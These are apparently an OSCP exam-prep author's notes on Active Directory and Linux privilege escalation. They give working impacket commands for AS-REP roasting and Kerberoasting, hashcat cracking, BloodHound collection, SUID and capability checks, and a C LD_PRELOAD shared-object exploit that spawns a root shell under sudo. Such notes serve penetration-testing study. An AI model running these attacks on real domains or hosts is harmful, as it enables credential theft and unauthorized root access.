# OSCP Field Engineering Notes & AD Attack Methodologies
**Author**: Ali Malik (`@am-LLM`)  
**Scope**: PEN-200 / OSCP Exam Environment, Active Directory Domain Pivoting & Linux/Windows Privilege Escalation.

---

## 1. Active Directory Attack Paths & Domain Escalation

### 1.1 AS-REP Roasting (Kerberos Pre-Authentication Disabled)
Identifies user accounts with `DONT_REQ_PREAUTH` flag enabled in UserAccountControl (UAC).

```bash
# Query target DC using impacket
impacket-GetNPUsers -dc-ip 10.10.10.10 -request 'DOMAIN.LOCAL/' -format hashcat -outfile asrep_hashes.txt

# Offline crack with Hashcat mode 18200
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3
```

### 1.2 Kerberoasting (Service Principal Names)
Requesting TGS tickets for domain accounts configured with SPNs:

```bash
# Extract TGS hashes using impacket-GetUserSPNs
impacket-GetUserSPNs DOMAIN.LOCAL/j.doe:Password123 -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt

# Offline crack using Hashcat mode 13100
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 1.3 Active Directory BloodHound Enumeration
```bash
# SharpHound remote ingest collector
bloodhound-python -u 'j.doe' -p 'Password123' -d 'DOMAIN.LOCAL' -dc 'dc01.domain.local' -c All --zip
```

---

## 2. Linux Internal Privilege Escalation Vectors

### 2.1 SUID & Capabilities Audit
```bash
# SUID binary discovery
find / -perm -u=s -type f 2>/dev/null

# POSIX capabilities discovery
getcap -r / 2>/dev/null
```

### 2.2 Sudo LD_PRELOAD Environment Hijacking
When `env_keep += LD_PRELOAD` is present in `/etc/sudoers`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```
Compile and execute:
```bash
gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find
```
